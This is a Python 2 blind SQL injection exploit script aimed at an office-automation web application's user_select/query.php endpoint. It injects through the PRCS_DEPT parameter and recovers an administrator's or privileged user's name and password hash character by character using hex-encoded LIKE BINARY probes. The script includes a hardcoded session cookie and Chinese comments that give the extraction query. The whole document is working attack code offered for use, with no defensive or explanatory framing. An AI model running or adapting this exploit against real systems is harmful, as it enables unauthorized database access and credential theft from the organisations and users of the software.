#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests
import sys

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

reload(sys)
sys.setdefaultencoding('utf8')

target = "http://www.xxx.com/"
cookie = "USER_NAME_COOKIE=zhangjing; OA_USER_ID=3793; PHPSESSID=lh46dhpr0hnd07e9g1sahabhk5; SID_3793=66f3b03b"

word = ''
hex_word = '0x'
for j in range(1,60):
    is_finished = True
    for i in range(1, 128):
        if i in [37, 95]: #排除可能干扰的%和_
            continue
        try:
            tmp = hex(i)[2:]
            if len(tmp) == 1:
                tmp = "0" + tmp
            elif len(tmp) == 2:
                pass
            try_hex_word = hex_word + tmp + "25"
            #直接注管理员，如果admin解不出来，就找 user_function表中包含77,user表中not_login=0的用户
            #select concat(byname,0x23,password) from user where user.user_id in (select byname from user_function where user_func_id_str like 0x252c37372c25 and user_id != 0x61646d696e) and user.not_login=0 order by user_id desc limit 0,1
            res = requests.get(target + "/module/appbuilder/user_select/query.php?FLOW_ID=&RUN_ID=&PRCS_ID=&PRCS_ID_NEXT=111&LINE_COUNT=&USER_NAME=a&IS_MANAGE=&PRCS_KEY_ID=&a=/*&IS_CHILD_NODE=0&PRCS_BACK=&PRCS_DEPT=1))or%20(select concat(hex(byname),0x23,password) from user where user.user_id in (select user_id from user_function where user_func_id_str like 0x252c37372c25) and user.not_login=0 limit 0,1)%20like%20binary%20{}%20and((1=1&b=*/".format(try_hex_word), verify=False, timeout=5, headers={"Cookie":cookie, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}, proxies={"https":"http://127.0.0.1:8080"})
            if "未查询到用户" not in res.text:
                hex_word += hex(i)[2:]
                word += chr(i)
                print(word)
                is_finished = False
                break
        except:
            pass
    if is_finished:
        print(word)
        print('over')
        break

